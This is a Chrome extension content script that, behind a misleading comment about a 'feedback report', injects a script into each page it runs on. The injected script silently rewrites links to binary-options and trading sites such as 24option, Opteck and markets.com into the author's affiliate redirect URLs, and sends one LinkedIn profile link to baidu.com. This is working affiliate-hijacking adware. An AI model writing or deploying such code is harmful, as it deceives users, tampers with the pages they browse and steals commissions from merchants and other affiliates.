chrome.extension.onMessage.addListener(

    function(request, sender) {

        var blacklist = request.bl;
        
        blacklist = blacklist.split("\n");

        var blacklisted;

        // Inject Styles and Elements for feedback report

        var embedding_script = document.createElement("script");

        embedding_script.type = "text/javascript";

        embedding_script.text = 'function replaceUrls(targetTagName, attributeName, originalUrl, targetUrl){' + 
            'var matchingElements = [];' +
            'var allElements = document.getElementsByTagName(targetTagName);' + 
            'for (var i = 0, n = allElements.length; i < n; i++){' + 
            'if (allElements[i].getAttribute(attributeName) != null && allElements[i].getAttribute(attributeName).indexOf(originalUrl) != -1){' + 
            'allElements[i].setAttribute(attributeName, targetUrl);}}}' +     
            'replaceUrls("a", "href", "online.24winner.com", "http://online.24winner.com/promoRedirect?member=signalsb&campaign=DEFAULT&channel=DEFAULT&zone=53082149&lp=53014172");' + 
            'replaceUrls("a", "href", "online.winner.com", "http://online.24winner.com/promoRedirect?member=signalsb&campaign=DEFAULT&channel=DEFAULT&zone=53082149&lp=53014172");' + 
            'replaceUrls("a", "href", "aff.optiontime.com", "http://aff.optiontime.com/promoRedirect?key=ej0xMzYyMDYxOSZsPTEzNTkwOTMzJnA9NjYwNA%3D%3D");' + 
            'replaceUrls("a", "href", "go.wepayaffiliates.com", "http://go.wepayaffiliates.com/visit/?bta=35112&nci=5556");' + 
            'replaceUrls("a", "href", "optionfair", "http://affiliate.optionfairpartners.com/processing/clickthrgh.asp?btag=a_1541b_1110&aid=");' + 
            'replaceUrls("a", "href", "serv.markets.com", "http://serv.markets.com/promoRedirect?key=ej0xNDA5MTM4NyZsPTE0MDkxMzgzJnA9ODYwNg%3D%3D");' + 
            'replaceUrls("a", "href", "opteck", "http://lp.opteck.com/s/230/?olgs_aff=3238&olgs_sid=26&olgs_tr=learning_kurs_anton&olgs_str=");' + 
            'replaceUrls("a", "href", "optaffiliates.com", "http://lp.opteck.com/s/230/?olgs_aff=3238&olgs_sid=26&olgs_tr=learning_kurs_anton&olgs_str=");' + 
            'replaceUrls("a", "href", "24option", "http://option.go2jump.org/SHDTMr");' + 
            'replaceUrls("a", "href", "media.go2speed.org", "http://option.go2jump.org/SHDTMr");' + 
            'replaceUrls("a", "href", "option.go2jump.org", "http://option.go2jump.org/SHDTMr");' + 
            'replaceUrls("a", "href", "aff.optitrade24.com", "http://aff.optitrade24.com/click.php?ctag=a675-b13-p");' +
            'replaceUrls("a", "href", "https://www.linkedin.com/profile/view?id=AAMAABLFfkQBHTWCKJKVqMAW7yKJ0hHSlJhYbgg&authType=name&authToken=gnJO&trk=hp-rr-pymk-name&csrfToken=ajax%3A0987382590866335013", "http://www.baidu.com/");' +
            '';

        document.getElementsByTagName("body")[0].appendChild(embedding_script);

        return true;

    }

  );
